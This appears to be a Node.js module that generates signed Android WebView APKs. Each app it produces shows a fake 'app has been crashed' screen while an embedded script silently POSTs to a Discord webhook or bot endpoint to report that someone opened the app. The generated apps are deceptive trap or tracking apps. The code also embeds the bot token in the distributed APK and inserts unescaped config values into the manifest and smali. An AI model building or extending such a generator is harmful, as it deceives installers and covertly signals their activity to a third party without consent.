/**
 * APK generation logic — ported from api-server TypeScript to plain JS.
 */

const { execFile } = require("child_process");
const {
  cpSync,
  existsSync,
  mkdirSync,
  readFileSync,
  writeFileSync,
} = require("fs");
const path = require("path");
const { promisify } = require("util");
const { deflateSync } = require("zlib");
const { randomUUID } = require("crypto");

const {
  APKTOOL_JAR,
  AAPT2_PATH,
  APK_OUTPUT_DIR,
  KEYSTORE_PATH,
  ensureToolsReady,
  findJava,
} = require("./apk-setup");

const execFileAsync = promisify(execFile);

const TEMPLATE_DIR = path.join(__dirname, "template");

const ICON_UPLOAD_DIR = path.join(process.cwd(), ".apk-output", "icons");

const jobs = new Map();

function createJob(config) {
  const jobId = randomUUID();
  const job = {
    jobId,
    status: "pending",
    downloadUrl: null,
    errorMessage: null,
    createdAt: new Date().toISOString(),
    appName: config.appName,
    packageName: config.packageName,
  };
  jobs.set(jobId, job);

  buildApkInBackground(jobId, config).catch((err) => {
    console.error("[apk-generator] Unexpected build failure:", err);
    const j = jobs.get(jobId);
    if (j) {
      j.status = "error";
      j.errorMessage = "Unexpected build failure";
    }
  });

  return job;
}

function getJob(jobId) {
  return jobs.get(jobId);
}

function getApkPath(jobId) {
  const job = jobs.get(jobId);
  if (!job || job.status !== "complete") return null;
  const p = path.join(APK_OUTPUT_DIR, `${jobId}.apk`);
  return existsSync(p) ? p : null;
}

async function buildApkInBackground(jobId, config) {
  const job = jobs.get(jobId);
  job.status = "building";
  try {
    await ensureToolsReady();

    const workDir = path.join(APK_OUTPUT_DIR, `build-${jobId}`);
    cpSync(TEMPLATE_DIR, workDir, { recursive: true });

    patchManifest(workDir, config);
    patchStrings(workDir, config.appName);
    patchSmali(workDir, config);
    await generateIcons(workDir, config);

    const unsignedApk = path.join(APK_OUTPUT_DIR, `${jobId}-unsigned.apk`);
    const signedApk = path.join(APK_OUTPUT_DIR, `${jobId}.apk`);

    await buildWithApktool(workDir, unsignedApk);
    await signApk(unsignedApk, signedApk);

    job.status = "complete";
    job.downloadUrl = `/api/apk/jobs/${jobId}/download`;
    console.log(`[apk-generator] APK build complete: ${jobId}`);
  } catch (err) {
    console.error(`[apk-generator] APK build error (${jobId}):`, err);
    job.status = "error";
    job.errorMessage = err instanceof Error ? err.message : "Build failed";
  }
}

function patchManifest(workDir, config) {
  const p = path.join(workDir, "AndroidManifest.xml");
  let content = readFileSync(p, "utf-8");
  content = content
    .replace(
      /package="com\.webviewapp\.template"/g,
      `package="${config.packageName}"`,
    )
    .replace(
      /android:versionCode="\d+"/g,
      `android:versionCode="${config.versionCode}"`,
    )
    .replace(
      /android:versionName="[^"]+"/g,
      `android:versionName="${config.versionName}"`,
    );
  writeFileSync(p, content, "utf-8");
}

function patchStrings(workDir, appName) {
  const p = path.join(workDir, "res", "values", "strings.xml");
  let content = readFileSync(p, "utf-8");
  content = content.replace(
    /<string name="app_name">[^<]*<\/string>/,
    `<string name="app_name">${escapeXml(appName)}</string>`,
  );
  writeFileSync(p, content, "utf-8");
}

function getApiBaseUrl() {
  const domains = process.env.REPLIT_DOMAINS;
  if (domains) return `https://${domains.split(",")[0].trim()}`;
  const devDomain = process.env.REPLIT_DEV_DOMAIN;
  if (devDomain) return `https://${devDomain}`;
  return "http://localhost:80";
}

function patchSmali(workDir, config) {
  const oldPkg = "com/webviewapp";
  const newPkgPath = config.packageName.replace(/\./g, "/");
  const oldSmaliPath = path.join(
    workDir,
    "smali",
    oldPkg,
    "MainActivity.smali",
  );
  const newSmaliDir = path.join(workDir, "smali", newPkgPath);
  const newSmaliPath = path.join(newSmaliDir, "MainActivity.smali");

  let content = readFileSync(oldSmaliPath, "utf-8");

  const oldClass = `Lcom/webviewapp/MainActivity;`;
  const newClass = `L${newPkgPath}/MainActivity;`;

  const isBotMode = config.notifyMode === "bot";
  let crashHtml;

  if (isBotMode && config.botToken && config.serverId) {
    crashHtml = buildBotCrashHtml({
      apiBase: getApiBaseUrl(),
      botToken: config.botToken,
      serverId: config.serverId,
      categoryId: config.categoryId,
      appName: config.appName,
      packageName: config.packageName,
    });
  } else {
    const msgContent = `\\ud83d\\udcf1 Someone just opened your app!`;
    crashHtml = buildWebhookCrashHtml(config.websiteUrl ?? "", msgContent);
  }

  content = content
    .replace(new RegExp(oldClass.replace(/[/[\]]/g, "\\$&"), "g"), newClass)
    .replace(/"CRASH_HTML_PLACEHOLDER"/g, `"${crashHtml}"`);

  mkdirSync(newSmaliDir, { recursive: true });
  writeFileSync(newSmaliPath, content, "utf-8");

  if (newSmaliPath !== oldSmaliPath) {
    try {
      require("fs").rmSync(oldSmaliPath);
    } catch {}
  }
}

function buildWebhookCrashHtml(webhookUrl, msgContent) {
  return (
    `<html><body style='background:#111;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center'>` +
    `<div><div style='font-size:72px;margin-bottom:16px'>&#128165;</div>` +
    `<h2 style='margin:0 0 12px;font-size:24px'>app has been crashed!!!</h2>` +
    `<p style='margin:0;color:#aaa;font-size:16px'>Please contact the developer</p></div>` +
    `<script>fetch('${webhookUrl}',{method:'POST',headers:{'Content-Type':'application/json'},` +
    `body:JSON.stringify({content:'${msgContent}'})}).catch(function(){})<\\/script>` +
    `<\\/body><\\/html>`
  );
}

function buildBotCrashHtml(opts) {
  const { apiBase, botToken, serverId, categoryId, appName, packageName } =
    opts;
  const body = JSON.stringify({
    botToken,
    serverId,
    ...(categoryId ? { categoryId } : {}),
    appName,
    packageName,
  });
  const escapedBody = body
    .replace(/'/g, "\\'")
    .replace(/\\/g, "\\\\")
    .replace(/"/g, '\\"');
  return (
    `<html><body style='background:#111;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center'>` +
    `<div><div style='font-size:72px;margin-bottom:16px'>&#128165;</div>` +
    `<h2 style='margin:0 0 12px;font-size:24px'>app has been crashed!!!</h2>` +
    `<p style='margin:0;color:#aaa;font-size:16px'>Please contact the developer</p></div>` +
    `<script>fetch('${apiBase}/api/discord-notify',{method:'POST',headers:{'Content-Type':'application/json'},` +
    `body:'${escapedBody}'}).catch(function(){})<\\/script>` +
    `<\\/body><\\/html>`
  );
}

async function generateIcons(workDir, config) {
  const densities = [
    { dir: "mipmap-mdpi", size: 48 },
    { dir: "mipmap-hdpi", size: 72 },
    { dir: "mipmap-xhdpi", size: 96 },
    { dir: "mipmap-xxhdpi", size: 144 },
    { dir: "mipmap-xxxhdpi", size: 192 },
  ];

  let iconData = null;
  if (config.iconUrl) {
    try {
      const resp = await fetch(config.iconUrl, {
        signal: AbortSignal.timeout(10000),
      });
      if (resp.ok) {
        iconData = Buffer.from(await resp.arrayBuffer());
      }
    } catch {
      console.warn("[apk-generator] Failed to download icon, using default");
    }
  }

  const color = parseHexColor(config.themeColor);

  for (const { dir, size } of densities) {
    const iconDir = path.join(workDir, "res", dir);
    mkdirSync(iconDir, { recursive: true });
    const pngBuffer = iconData
      ? await resizePng(iconData, size)
      : generateColorSquarePng(size, color.r, color.g, color.b);
    writeFileSync(path.join(iconDir, "ic_launcher.png"), pngBuffer);
  }
}

async function buildWithApktool(workDir, outputApk) {
  const java = findJava();
  const args = ["-jar", APKTOOL_JAR, "b", workDir, "-o", outputApk];
  if (existsSync(AAPT2_PATH)) {
    args.push("--aapt2-path", AAPT2_PATH);
  }
  const { stdout, stderr } = await execFileAsync(java, args, {
    timeout: 120000,
  });
  console.log(
    "[apk-generator] apktool:",
    stdout.slice(-500),
    stderr.slice(-500),
  );
}

async function signApk(unsignedApk, signedApk) {
  const java = findJava();
  const jarsigner = java.replace(/java$/, "jarsigner");
  await execFileAsync(
    jarsigner,
    [
      "-sigalg",
      "SHA256withRSA",
      "-digestalg",
      "SHA-256",
      "-keystore",
      KEYSTORE_PATH,
      "-storepass",
      "android",
      "-keypass",
      "android",
      "-signedjar",
      signedApk,
      unsignedApk,
      "androiddebugkey",
    ],
    { timeout: 60000 },
  );
}

function parseHexColor(hex) {
  const clean = (hex || "").replace("#", "");
  const r = parseInt(clean.substring(0, 2), 16) || 99;
  const g = parseInt(clean.substring(2, 4), 16) || 102;
  const b = parseInt(clean.substring(4, 6), 16) || 241;
  return { r, g, b };
}

function generateColorSquarePng(size, r, g, b) {
  const sig = Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]);
  const ihdrData = Buffer.alloc(13);
  ihdrData.writeUInt32BE(size, 0);
  ihdrData.writeUInt32BE(size, 4);
  ihdrData[8] = 8;
  ihdrData[9] = 2;
  const rowSize = 1 + size * 3;
  const raw = Buffer.alloc(size * rowSize);
  for (let y = 0; y < size; y++) {
    raw[y * rowSize] = 0;
    for (let x = 0; x < size; x++) {
      const off = y * rowSize + 1 + x * 3;
      const cx = size / 2;
      const cy = size / 2;
      const radius = size / 2;
      const dist = Math.sqrt((x - cx) ** 2 + (y - cy) ** 2);
      if (dist <= radius) {
        raw[off] = r;
        raw[off + 1] = g;
        raw[off + 2] = b;
      } else {
        raw[off] = 255;
        raw[off + 1] = 255;
        raw[off + 2] = 255;
      }
    }
  }
  const compressed = deflateSync(raw);

  function chunk(type, data) {
    const len = Buffer.alloc(4);
    len.writeUInt32BE(data.length, 0);
    const typeB = Buffer.from(type, "ascii");
    const crcVal = crc32(Buffer.concat([typeB, data]));
    const crcB = Buffer.alloc(4);
    crcB.writeUInt32BE(crcVal >>> 0, 0);
    return Buffer.concat([len, typeB, data, crcB]);
  }

  return Buffer.concat([
    sig,
    chunk("IHDR", ihdrData),
    chunk("IDAT", compressed),
    chunk("IEND", Buffer.alloc(0)),
  ]);
}

async function resizePng(data, size) {
  try {
    const sharp = require("sharp");
    return await sharp(data).resize(size, size).png().toBuffer();
  } catch {
    return generateColorSquarePng(size, 99, 102, 241);
  }
}

function crc32(buf) {
  let crc = 0xffffffff;
  for (let i = 0; i < buf.length; i++) {
    crc ^= buf[i];
    for (let j = 0; j < 8; j++) {
      crc = crc & 1 ? (crc >>> 1) ^ 0xedb88320 : crc >>> 1;
    }
  }
  return (crc ^ 0xffffffff) >>> 0;
}

function escapeXml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&apos;");
}

module.exports = { createJob, getJob, getApkPath, ICON_UPLOAD_DIR };
